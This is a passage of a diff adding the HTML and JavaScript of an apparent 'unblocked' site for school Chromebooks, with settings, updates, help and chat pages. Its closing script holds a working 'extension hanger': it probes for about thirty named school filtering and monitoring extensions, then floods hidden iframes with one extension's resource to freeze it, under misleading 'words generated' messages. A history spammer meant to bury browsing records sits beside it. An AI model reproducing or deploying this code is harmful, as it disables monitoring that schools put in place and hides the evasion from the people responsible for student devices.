+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm-1 16h-2v-2h2v2zm0-4h-2V8h2v6zm5-6h-4V4l4 4z"/></svg>
+                        Open
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <section id="misc" class="panel space-y-6" hidden aria-hidden="true">
+            <!-- ... content for misc ... -->
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-4">Data Management</h2>
+                <p class="text-slate-300 mb-6">Export and import data to preserve progress across different links or devices.</p>
+                <div class="flex justify-between items-center p-4 mb-4 rounded-lg bg-slate-900 border border-slate-800">
+                    <div class="flex-grow">
+                        <h3 class="text-lg font-bold text-white">Download Cookie/Data</h3>
+                        <p class="text-sm text-slate-400">Exports application settings and local data to a JSON file.</p>
+                    </div>
+                    <button id="downloadCookie" class="neon-btn flex items-center text-sm" onclick="window.downloadCookieData()">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                        Download
+                    </button>
+                </div>
+
+                <div class="flex justify-between items-center p-4 rounded-lg bg-slate-900 border border-slate-800">
+                    <div class="flex-grow">
+                        <h3 class="text-lg font-bold text-white">Upload Cookie/Data</h3>
+                        <p class="text-sm text-slate-400">Imports data from a local JSON file to restore settings and progress.</p>
+                    </div>
+                    <button id="uploadCookie" class="neon-btn flex items-center text-sm" onclick="window.uploadCookieData()">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7z" transform="rotate(180 12 12)"/></svg>
+                        Upload
+                    </button>
+                </div>
+
+                <p id="import-status" class="text-sm text-baby-blue mt-4"></p>
+            </div>
+
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0.2s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-4">Uptime Status</h2>
+                <p class="text-slate-300 mb-6">Utility links
+                and tools related to the project's availability.</p>
+                <div class="flex justify-between items-center p-4 rounded-lg bg-slate-900 border border-slate-800">
+                    <div class="flex-grow">
+                        <h3 class="text-lg font-bold text-white">Uptime Status Page</h3>
+                        <p class="text-sm text-slate-400">Open the project's status page to view current availability and metrics.</p>
+                    </div>
+                    <a href="https://deltav10.betteruptime.com/" target="_blank" class="neon-btn flex items-center text-sm">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 12h-2V8h-2V6h4V4h-6v2H9v2H7v4H5v7h14v-7zM7 17h10v-4H7v4z"/></svg>
+                        Open
+                    </a>
+                </div>
+            </div>
+
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0.4s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-4">Partners</h2>
+                <p class="text-slate-300 mb-6">Other projects we are partnered with.</p>
+                <div class="flex justify-between items-center p-4 rounded-lg bg-slate-900 border
+                border-slate-800">
+                    <div class="flex-grow">
+                        <h3 class="text-lg font-bold text-white">Partners Page</h3>
+                        <p class="text-sm text-slate-400">Open the project's partners page to view current partners.</p>
+                    </div>
+                    <a href="/partners" onclick="route(event)" class="neon-btn flex items-center text-sm">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 12h-2V8h-2V6h4V4h-6v2H9v2H7v4H5v7h14v-7zM7 17h10v-4H7v4z"/></svg>
+                        Open
+                    </a>
+                </div>
+            </div>
+
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0.6s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-4">Updates</h2>
+                <p class="text-slate-300 mb-6">Recent updates to this site.</p>
+                <div class="flex justify-between items-center p-4 rounded-lg bg-slate-900 border border-slate-800">
+                    <div class="flex-grow">
+                        <h3 class="text-lg font-bold text-white">Updates Page</h3>
+                        <p class="text-sm text-slate-400">Open the project's updates page to view the latest updates to this website.</p>
+                    </div>
+                    <a href="/updates" onclick="route(event)" class="neon-btn flex items-center text-sm">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 12h-2V8h-2V6h4V4h-6v2H9v2H7v4H5v7h14v-7zM7 17h10v-4H7v4z"/></svg>
+                        Open
+                    </a>
+                </div>
+            </div>
+            
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0.8s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-4">Support</h2>
+                <p class="text-slate-300 mb-6">Need help?
+                Email us!</p>
+                <div style="text-align: center;"
+                class="items-center p-4 rounded-lg bg-slate-900 border border-slate-800">
+                    <a id="email" target="_blank" href="mailto:deltasvth@gmail.com">Owner Email</a>
+                    <br>
+                    <a id="email" target="_blank" href="mailto:puckgaming30@gmail.com">Co-Owner Email</a>
+                </div>
+            </div>
+        </section>
+    </div>
+</div>
+            `,
+            'updates': `
+              <main>
+   <section id="overview" class="py-20 md:py-32 text-center max-w-5xl mx-auto px-4">
+    <div class="max-w-4xl mx-auto">
+        <h2 class="text-5xl md:text-7xl font-extrabold mb-6 leading-tight animate-in" style="animation-delay: 0s;">
+            <span class="neon-text">Updates:</span> <br>
+        </h2>
+        <h3 style="font-size: 30px; font-weight: bolder;" class="animate-in" style="animation-delay: 0.2s;">
+            Delta V10.0.0
+        </h3>
+        <ul class="text-center font-share-tech list-none space-y-1 max-w-2xl mx-auto mb-8 animate-in" style="animation-delay: 0.4s;">
+            <li class="text-lg text-gray-400 p-1 rounded-md">- Chrome history spammer added</li>
+            <li class="text-lg text-gray-400 p-1 rounded-md">- Extension hanger added</li>
+        </ul>
+    </div>
+</section>
+            `,
+             'help': `
+              <main>
+   <section id="overview" class="py-20 md:py-32 text-center max-w-5xl mx-auto px-4">
+<div class="max-w-4xl mx-auto">
+    <h2 class="text-5xl md:text-7xl font-extrabold mb-6 leading-tight animate-in" style="animation-delay: 0s;">
+        <span class="neon-text">Delta Issues</span> <br>
+    </h2>
+    <h3 style="font-size: 30px; font-weight: bolder;" class="animate-in" style="animation-delay: 0.2s;">Games</h3>
+    <ul class="text-center font-share-tech list-none space-y-1 max-w-2xl mx-auto mb-8 animate-in" style="animation-delay: 0.4s;">
+        <li class="text-lg text-gray-400 p-1 rounded-md">If a game is not working, its mostly blocked because some games use a GitHack link.</li>
+    </ul> 
+    <h3 style="font-size: 30px; font-weight: bolder;" class="animate-in" style="animation-delay: 0.6s;">Website</h3>
+    <ul class="text-center font-share-tech list-none space-y-1 max-w-2xl mx-auto mb-8 animate-in" style="animation-delay: 0.8s;">
+        <li class="text-lg text-gray-400 p-1 rounded-md">If the website is blank, either switch your Wi-Fi or restart your Chromebook.</li>
+        <li class="text-lg text-gray-400 p-1 rounded-md">If the website shows "No CodeHS.me Site Here", make sure the link has <code>/index</code> at the end.</li>
+    </ul>
+    <h3 style="font-size: 30px; font-weight: bolder;" class="animate-in" style="animation-delay: 1.0s;">Proxy</h3>
+    <ul class="text-center font-share-tech list-none space-y-1 max-w-2xl mx-auto mb-8 animate-in" style="animation-delay: 1.2s;">
+        <li class="text-lg text-gray-400 p-1 rounded-md">If any proxies don't work, then they are blocked</li>
+    </ul> 
+</div>
+</section>
+            `,
+            'chat': `
+              <div class="wrap" id="wrap">
+   <header>
+    <h1 id="chatTitle">Public Chat — Delta</h1>
+    <div class="controls">
+        <button id="createRoomBtn" class="ghost" title="Create a new private room">🔒 New Room</button>
+        <input id="roomCodeInput" type="text" placeholder="Room Code" maxlength="6" style="min-width:90px;" />
+        <button id="joinRoomBtn">Join</button>
+        <span style="width:1px;height:20px;background:rgba(255,255,255,0.06);margin:0 4px;"></span>
+        <input id="username" type="text" placeholder="pick a username" maxlength="20" />
+        <button id="setNameBtn" class="ghost">Confirm User</button>
+        <button id="anonBtn" class="ghost">Random User</button>
+        <button id="clearBtn" class="ghost" title="Clear chat locally">Clear Chat</button>
+    </div>
+</header>
+    <main style="display:grid;grid-template-columns:220px 1fr;gap:12px;">
+      <div class="room-list-card">
+        <h3>Rooms</h3>
+        <div id="roomList">
+          <button id="publicChatButton" onclick="switchToPublic()" class="active">🌐 Public Chat</button>
+          </div>
+      </div>
+      <div class="chat-card" id="chatCard" style="height: 66vh;">
+        <div class="messages" id="messages" aria-live="polite"></div>
+        <div id="typingIndicator" class="tiny" style="opacity:0.85;height:18px;margin-top:6px;"></div>
+        <div class="composer">
+          <textarea id="messageInput" placeholder="Message Public Chat... (Shift+Enter for newline)"></textarea>
+          <div style="display:flex;flex-direction:column;gap:8px">
+            <button id="sendBtn">Send</button>
+            <button id="publicBtn" class="ghost tiny" style="display:none;">🌐 Public</button>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer>
+      <div class="tiny" id="channelStatus">Public channel • everyone can read & post</div>
+      <div class="tiny" id="status">Disconnected</div>
+    </footer>
+  </div>
+            `
+        };
+
+function route(event) {
+    if (event && (event.target.closest('a').getAttribute('target') === '_blank' || !event.target.closest('a').getAttribute('href').startsWith('/'))) {
+        return;
+    }
+    event = event || window.event;
+    event.preventDefault();
+    const targetPath = event.target.closest('a').getAttribute('href') || '/';
+    window.history.pushState({}, '', targetPath);
+    loadPage();
+}
+
+function loadPage() {
+    const path = window.location.pathname;
+    const routeName = routes[path] || 'index'; 
+    const content = pageContent[routeName];
+    if (content) {
+        appContent.innerHTML = content; 
+        setupPage(routeName);
+        window.scrollTo(0, 0);
+    } else {
+        appContent.innerHTML = '<h1>404: Page Not Found</h1><p>The page you\'re looking for has taken a detour. Go back and play some games.</p>';
+    }
+}
+
+function setupPage(routeName) {
+    if (routeName === 'settings') {
+        document.querySelectorAll('#navButtons .nav-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                document.querySelectorAll('#navButtons .nav-btn').forEach(btn => btn.classList.remove('active'));
+                this.classList.add('active');
+                document.querySelectorAll('#settingsContent .panel').forEach(panel => panel.hidden = true);
+                document.getElementById(this.getAttribute('data-target')).hidden = false;
+            });
+        });
+        if (window.initSettingsPage) window.initSettingsPage();
+        if(window.initExtensionTool) window.initExtensionTool();
+    }
+    if (routeName === 'games' && window.initGameGrid) window.initGameGrid();
+    if (routeName === 'ai' && window.initChatbot) window.initChatbot(); 
+    if (routeName === 'chat' && window.initPublicChat) window.initPublicChat();
+    bindGlobalListeners();
+}
+
+function injectLinkHighlightElement() {
+    const highlightHtml = `
+        <div id="link-highlight-follower" class="absolute w-12 h-12 rounded-full bg-cyan-400/10 blur-xl pointer-events-none" 
+             style="opacity: 0; transition: opacity 0.3s ease-out; z-index: 9999;"></div>
+    `;
+    document.body.insertAdjacentHTML('afterbegin', highlightHtml);
+}
+
+function bindGlobalListeners() {
+    const follower = document.getElementById('link-highlight-follower');
+    if (!follower) return;
+    document.querySelectorAll('a[href^="/"]:not([target="_blank"])').forEach(link => {
+        link.removeEventListener('click', route);
+        link.addEventListener('click', route);
+    });
+    const interactiveElements = document.querySelectorAll('a, button, input[type="submit"], .nav-btn');
+    interactiveElements.forEach(element => {
+        element.removeEventListener('mousemove', handleGlowMove);
+        element.removeEventListener('mouseleave', handleGlowLeave);
+        element.addEventListener('mousemove', handleGlowMove);
+        element.addEventListener('mouseleave', handleGlowLeave);
+    });
+}
+
+const MANUAL_X_CORRECTION = -68; 
+const MANUAL_Y_CORRECTION = -20.5; 
+
+function handleGlowMove(e) {
+    const follower = document.getElementById('link-highlight-follower');
+    if (!follower) return;
+    const adjustedX = e.clientX + MANUAL_X_CORRECTION;
+    const adjustedY = e.clientY + MANUAL_Y_CORRECTION;
+    follower.style.transform = `translate3d(${adjustedX}px, ${adjustedY}px, 0) translate(-50%, -50%)`;
+    follower.style.opacity = '1';
+}
+
+function handleGlowLeave() {
+    const follower = document.getElementById('link-highlight-follower');
+    if (follower) follower.style.opacity = '0';
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    injectLinkHighlightElement();
+    bindGlobalListeners();
+    loadPage();
+});
+
+window.addEventListener('popstate', loadPage);
+
+/* =========================================
+   SPAMMER LOGIC (ORIGINAL VERSION)
+   ========================================= */
+const spammer_originalTitle = document.title;
+const spammer_originalFaviconElem = document.getElementById("faviconLink");
+const spammer_originalFavicon = spammer_originalFaviconElem ? spammer_originalFaviconElem.href : ''; 
+
+window.spammer_toggleCollapsible = function(id) {
+    const element = document.getElementById(id);
+    if(element) element.classList.toggle('open');
+}
+
+window.spammer_changeFavicon = function(iconURL) {
+    let favicon = document.getElementById("faviconLink");
+    if (!favicon) {
+        favicon = document.createElement('link');
+        favicon.id = 'faviconLink';
+        favicon.rel = 'icon';
+        document.head.appendChild(favicon);
+    }
+    if (favicon) {
+        favicon.href = iconURL;
+    }
+}
+
+window.spammer_startSpamming = function() {
+    const durationInput = document.getElementById("spammer-duration");
+    const intervalInput = document.getElementById("spammer-interval");
+    const startButton = document.getElementById("spammer-startButton");
+    const progressContainer = document.getElementById("spammer-progressContainer");
+    const progressBar = document.getElementById("spammer-progressBar");
+    const statusMessage = document.getElementById("spammer-statusMessage");
+
+    const changeTabTitle = document.getElementById("spammer-changeTabTitle").checked;
+    const changeTabIcon = document.getElementById("spammer-changeTabIcon").checked;
+    const customTabTitle = document.getElementById("spammer-customTabTitle").value;
+    const customTabIcon = document.getElementById("spammer-customTabIcon").value;
+
+    const duration = parseFloat(durationInput.value);
+    const interval = parseFloat(intervalInput.value);
+
+    if (isNaN(duration) || isNaN(interval) || duration <= 0 || interval <= 0) {
+        statusMessage.textContent = "Please enter valid numbers for duration and interval";
+        statusMessage.className = "spammer-status active";
+        return;
+    }
+
+    if (changeTabTitle && customTabTitle) {
+        document.title = customTabTitle;
+    }
+
+    if (changeTabIcon && customTabIcon) {
+        window.spammer_changeFavicon(customTabIcon);
+    }
+
+    startButton.disabled = true;
+    startButton.textContent = "Spamming...";
+    progressContainer.style.display = "block";
+    statusMessage.className = "spammer-status";
+
+    let entriesCreated = 0;
+    const startTime = Date.now();
+    const endTime = startTime + (duration * 1000);
+
+    const updateProgress = () => {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min((elapsed / (duration * 1000)) * 100, 100);
+        if(progressBar) progressBar.style.width = `${progress}%`;
+    };
+
+    const spammer = setInterval(() => {
+        const currentTime = Date.now();
+        if (currentTime >= endTime) {
+            clearInterval(spammer);
+
+            startButton.disabled = false;
+            startButton.textContent = "Start Spamming";
+            statusMessage.textContent = `Spamming complete! Created ${entriesCreated} history entries.`;
+            statusMessage.className = "spammer-status active success";
+            if(progressBar) progressBar.style.width = "100%";
+
+            if (changeTabTitle) {
+                document.title = spammer_originalTitle;
+            }
+
+            if (changeTabIcon) {
+                window.spammer_changeFavicon(spammer_originalFavicon);
+            }
+
+            return;
+        }
+
+        const randomLat = (Math.random() * 180 - 90).toFixed(6);
+        const randomLng = (Math.random() * 360 - 180).toFixed(6);
+        const newUrl = `/spam?lat=${randomLat}&lng=${randomLng}&zoom=10`;
+
+        history.pushState(null, "", newUrl);
+        console.log("New URL:", newUrl);
+        entriesCreated++;
+
+        updateProgress();
+    }, interval * 1000);
+
+    const progressUpdater = setInterval(() => {
+        if (Date.now() >= endTime) {
+            clearInterval(progressUpdater);
+            return;
+        }
+        updateProgress();
+    }, 100);
+};
+
+/* =========================================
+   EXTENSION TOOL LOGIC
+   ========================================= */
+window.initExtensionTool = function() {
+    const extensions = {
+      "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
+      "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+      "Securly (1st ID)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
+      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
+      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
+      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
+      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
+      "Securly Classroom (2nd ID)": "chrome-extension://hkobaiihndnbfhbkmjjfbdimfbdcppdh/notfound.html",
+      "Securly Classroom (1st ID)": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
+      "Hapara (2nd ID)": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
+      "Hapara (1st ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
+      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
+      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
+      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
+      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
+      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
+      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
+      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
+      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
+      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
+      "classroom.cloud Student": "chrome-extension://mpkdoimpgkhjcicmhmlmgboelebflpla/_locales/lt/messages.json",
+      "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
+      "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
+      "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
+      "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
+      "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png"
+    };
+
+    const intensitySlider = document.getElementById('ext_resourceIntensity');
+    const intensityValue = document.getElementById('ext_resourceValue');
+    const selectElement = document.getElementById('ext_extensionSelect');
+    const overlay = document.getElementById('ext_processingOverlay');
+    const killButton = document.getElementById('ext_killButton');
+    const hangButton = document.getElementById('ext_hangButton');
+    const statusText = document.getElementById('ext_statusText');
+
+    if (!intensitySlider || !selectElement) return;
+
+    if(intensitySlider.getAttribute('data-bound') === 'true') return;
+    intensitySlider.setAttribute('data-bound', 'true');
+
+    intensitySlider.addEventListener('input', function () {
+      if(intensityValue) intensityValue.textContent = this.value;
+    });
+
+    async function checkExtensionURL(url) {
+        try {
+          const response = await fetch(url);
+          return response.ok;
+        } catch (error) {
+          return false;
+        }
+    }
+
+    async function populateExtensionDropdown() {
+      selectElement.innerHTML = '';
+      let foundExtensions = false;
+      for (const [name, url] of Object.entries(extensions)) {
+        try {
+          if (await checkExtensionURL(url)) {
+            const option = document.createElement('option');
+            option.value = url;
+            option.textContent = name;
+            selectElement.appendChild(option);
+            foundExtensions = true;
+          }
+        } catch (error) { }
+      }
+      if (!foundExtensions) {
+        const option = document.createElement('option');
+        option.value = '';
+        option.textContent = 'No supported extensions detected';
+        selectElement.appendChild(option);
+        if(hangButton) {
+            hangButton.disabled = true;
+            hangButton.style.opacity = '0.5';
+        }
+      }
+    }
+
+    function createAndReplaceIframes(container, url, count) {
+      for (let i = 0; i < count; i++) {
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.width = '1px';
+        iframe.style.height = '1px';
+        iframe.style.border = 'none';
+        iframe.style.position = 'absolute';
+        container.appendChild(iframe);
+      }
+      setTimeout(() => {
+        while (container.firstChild) {
+          container.removeChild(container.firstChild);
+        }
+        createAndReplaceIframes(container, url, count);
+      }, 5);
+    }
+
+    function startProcess() {
+      const selectedUrl = selectElement.value;
+      const selectedName = selectElement.options[selectElement.selectedIndex].text;
+      const resourceCount = parseInt(intensitySlider.value);
+      if (!selectedUrl) {
+        alert('Please select a word style first.');
+        return;
+      }
+      if(overlay) overlay.style.display = 'flex';
+
+      const popup = window.open('', 'ResourceManager', 'width=10,height=10,left=0,top=0');
+      if (!popup) {
+        alert('Popup blocked. Please allow popups for this site and try again.');
+        if(overlay) overlay.style.display = 'none';
+        return;
+      }
+
+      const container = popup.document.createElement('div');
+      popup.document.body.appendChild(container);
+      createAndReplaceIframes(container, selectedUrl, resourceCount);
+
+      setTimeout(() => {
+        popup.close();
+        setTimeout(() => {
+          if(overlay) overlay.style.display = 'none';
+          if(hangButton) hangButton.style.display = 'none';
+          if(selectElement) selectElement.style.display = 'none';
+          const labelSel = document.querySelector('#extension-tool-wrapper .selection-area label');
+          if(labelSel) labelSel.style.display = 'none';
+          if(intensitySlider) intensitySlider.style.display = 'none';
+          if(intensityValue) intensityValue.style.display = 'none';
+          
+          if(killButton) {
+              killButton.style.display = 'block';
+              killButton.setAttribute('data-url', selectedUrl);
+          }
+          if(statusText) {
+              statusText.style.display = 'block';
+              statusText.innerHTML = `Extension <strong>${selectedName}</strong> has been successfully suspended. Click the red button above to finalize the process.`;
+          }
+        }, 10000);
+      }, 5000);
+    }
+
+    function finalizeProcess() {
+      const selectedUrl = killButton.getAttribute('data-url');
+      if(killButton) killButton.style.display = 'none';
+      if(statusText) {
+          statusText.innerHTML = `<div class="completion-text">Words have been generated!</div>`;
+      }
+      setTimeout(() => {
+          window.location.href = selectedUrl;
+      }, 100);
+    }
+
+    if(hangButton) hangButton.addEventListener('click', startProcess);
+    if(killButton) killButton.addEventListener('click', finalizeProcess);
+
+    populateExtensionDropdown();
+};
+    </script>
+</body>
+</html>
